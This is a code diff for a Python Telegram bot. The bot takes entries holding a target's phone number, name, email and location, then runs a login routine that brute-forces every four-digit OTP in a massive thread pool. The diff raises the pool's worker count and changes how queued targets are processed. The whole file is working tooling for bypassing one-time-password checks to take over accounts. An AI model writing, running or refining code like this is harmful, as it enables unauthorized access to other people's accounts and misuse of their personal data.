@@ -18,7 +18,7 @@ HEADERS = {
     "Content-Type": "application/json"
 }
 
-# Dictionary to store data and queue for processing
+# Dictionary to store data and list for queue
 DATA_MAP = {}
 request_queue = []
 
@@ -128,7 +128,7 @@ async def process_login(chat_id, bot, message_data, key):
 
     async def check_otp_with_updates():
         nonlocal found_otp, checked_otps
-        with concurrent.futures.ThreadPoolExecutor(max_workers=300000) as executor:
+        with concurrent.futures.ThreadPoolExecutor(max_workers=350000) as executor:
             future_to_otp = {executor.submit(try_otp, otp): otp for otp in range(1000, 10000)}
 
             for i, future in enumerate(concurrent.futures.as_completed(future_to_otp)):
@@ -165,6 +165,7 @@ async def add_data(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 key = parts[0].strip()
                 value = parts[1].strip()
                 DATA_MAP[key] = value
+                request_queue.append((chat_id, value, key))  # Add all entries to queue
                 added_count += 1
             except IndexError:
                 await bot.send_message(chat_id, f"❌ Invalid format in entry: '{entry}'! Use: `key - ebooks/... - number - name - email - location`", parse_mode="Markdown")
@@ -172,11 +173,10 @@ async def add_data(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         if added_count > 0:
             await bot.send_message(chat_id, f"✅ Added {added_count} entries to DATA_MAP successfully!")
-            # Immediately process the first entry
-            first_key = sorted(DATA_MAP.keys())[0]
-            request_queue.append((chat_id, DATA_MAP[first_key], first_key))
-            await bot.send_message(chat_id, f"Starting to process first entry '{first_key}' immediately!")
-            await process_queue(context)  # Process first entry immediately
+            # Immediately trigger processing if queue was empty
+            if len(request_queue) == added_count:
+                await bot.send_message(chat_id, f"Starting to process first entry '{request_queue[0][2]}' immediately!")
+                context.job_queue.run_once(process_queue, 0, context=context)  # Process first entry immediately
         else:
             await bot.send_message(chat_id, "❌ No valid entries added! Use format: `key - ebooks/... - number - name - email - location` with each entry on a new line.")
     else:
@@ -190,24 +190,25 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if message in DATA_MAP:
         request_queue.append((chat_id, DATA_MAP[message], message))
         await bot.send_message(chat_id, f"✅ [{message}] Added request to queue. Will process when its turn comes.")
-        if len(request_queue) == 1:  # If this is the only item, process immediately
-            await process_queue(context)
+        # If queue was empty, start processing immediately
+        if len(request_queue) == 1:
+            context.job_queue.run_once(process_queue, 0, context=context)
     else:
         await bot.send_message(chat_id, f"❌ '{message}' not found! First add data using: `/add\n{message} - ebooks/... - number - name - email - location`", parse_mode="Markdown")
 
 async def process_queue(context: ContextTypes.DEFAULT_TYPE):
     if request_queue:
-        chat_id, message_data, key = request_queue.pop(0)  # Use pop(0) to remove from the front
+        chat_id, message_data, key = request_queue.pop(0)
         await context.bot.send_message(chat_id, f"Processing request for '{key}': {message_data.split(' - ')[1]}")
         await process_login(chat_id, context.bot, message_data, key)
+        # Schedule the next item if there are more in the queue
+        if request_queue:
+            context.job_queue.run_once(process_queue, 600, context=context)  # Next item after 10 minutes
 
 async def main():
     app = Application.builder().token(BOT_TOKEN).build()
     app.add_handler(CommandHandler("add", add_data))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
-    
-    # Schedule queue processing every 10 minutes, but allow immediate first run
-    app.job_queue.run_repeating(process_queue, interval=600, first=0)
     
     await app.initialize()
     await app.start()
